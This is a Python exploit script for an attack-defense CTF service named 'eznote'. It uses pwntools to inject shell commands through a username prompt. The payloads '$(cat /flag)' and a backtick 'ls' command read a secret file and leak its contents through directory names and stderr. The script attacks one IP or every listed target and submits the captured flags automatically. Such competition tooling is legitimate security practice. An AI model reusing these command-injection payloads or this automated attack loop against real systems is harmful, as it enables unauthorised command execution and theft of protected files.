#!/usr/bin/env python3
"""
eznote - Directory Name Leak Exploit
====================================
Vulnerability: Command injection leaks data via directory name creation

When username contains $(cmd), the output appears in the created directory path.
We can read this back using a second injection to list directories.

Usage:
    python3 eznote_exploit_dirleak.py local           # Test locally
    python3 eznote_exploit_dirleak.py 172.24.84.11   # Attack specific IP
    python3 eznote_exploit_dirleak.py                 # Attack all targets
"""

import sys
import os
import re

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from pwn_lib import shortcuts
from awd_lib import submit, targets, our_ip

BINARY = "./src/chall"
PORT = 1000
TIMEOUT = 10

context.log_level = 'error'
context.timeout = TIMEOUT


def exploit(ip, port, flag_path="/flag"):
    """Exploit using directory name leak."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Step 1: Create dir with flag content in name
        s.ru(b'Username: ')
        cmd = f'a$(cat {flag_path})'.encode()
        io.sendline(cmd)
        s.sla(b'> ', b'2')  # create note dir - embeds flag in dirname
        
        # Step 2: Use another injection to output directory listing
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        # List the directory contents and capture in error output
        io.sendline(b'x`ls /tmp/$PPID/*/ >&2`')
        s.sla(b'> ', b'2')  # trigger
        
        # Collect all output including stderr
        data = io.recvrepeat(2)
        io.close()
        
        # Look for flag pattern
        match = re.search(rb'(hkcert\d*\{[^}]+\})', data, re.IGNORECASE)
        if match:
            return match.group(1).decode()
        
        # Alternative: look for flag content starting with 'a'
        match = re.search(rb'/tmp/\d+/[a-f0-9]+/(a[^\s/]+)', data)
        if match:
            content = match.group(1).decode()
            if 'hkcert' in content.lower() or '{' in content:
                return content[1:]  # strip leading 'a'
        
        return None
        
    except Exception as e:
        return None


def exploit_local():
    """Test exploit locally."""
    import subprocess
    
    os.system('echo "hkcert24{dir_leak_test_flag}" > /tmp/flag')
    
    io = process(BINARY)
    pid = io.pid
    s = shortcuts(io)
    
    print(f"[*] PID: {pid}")
    
    # Step 1: Embed flag in directory name
    s.ru(b'Username: ')
    io.sendline(b'a$(cat /tmp/flag)')
    s.sla(b'> ', b'2')
    time.sleep(0.2)
    
    # Check what was created
    result = subprocess.run(['find', f'/tmp/{pid}', '-type', 'd'], 
                          capture_output=True, text=True)
    print(f"[*] Directories:\n{result.stdout}")
    
    # Step 2: Use injection to list and output
    s.sla(b'> ', b'1')
    s.ru(b'Username: ')
    io.sendline(b'x`ls /tmp/$PPID/*/ >&2`')
    s.sla(b'> ', b'2')
    
    data = io.recvrepeat(2)
    print(f"[*] Output: {data}")
    
    # Extract flag
    match = re.search(rb'(hkcert\d*\{[^}]+\})', data, re.IGNORECASE)
    if match:
        print(f"[+] FLAG FOUND: {match.group(1).decode()}")
    else:
        # Look in directory names
        for line in result.stdout.split('\n'):
            if 'hkcert' in line.lower():
                print(f"[+] FLAG IN DIR: {line}")
    
    io.close()


def main():
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "local":
            context.log_level = 'info'
            exploit_local()
        else:
            flag = exploit(arg, PORT)
            if flag:
                print(f"[+] Flag: {flag}")
                result = submit(flag, target=arg)
                print(f"[*] Submit: {result}")
            else:
                print(f"[-] No flag from {arg}")
    else:
        for ip in targets():
            print(f"[*] Attacking {ip}...")
            flag = exploit(ip, PORT)
            if flag:
                print(f"[+] Flag: {flag}")
                submit(flag, target=ip)


if __name__ == "__main__":
    main()
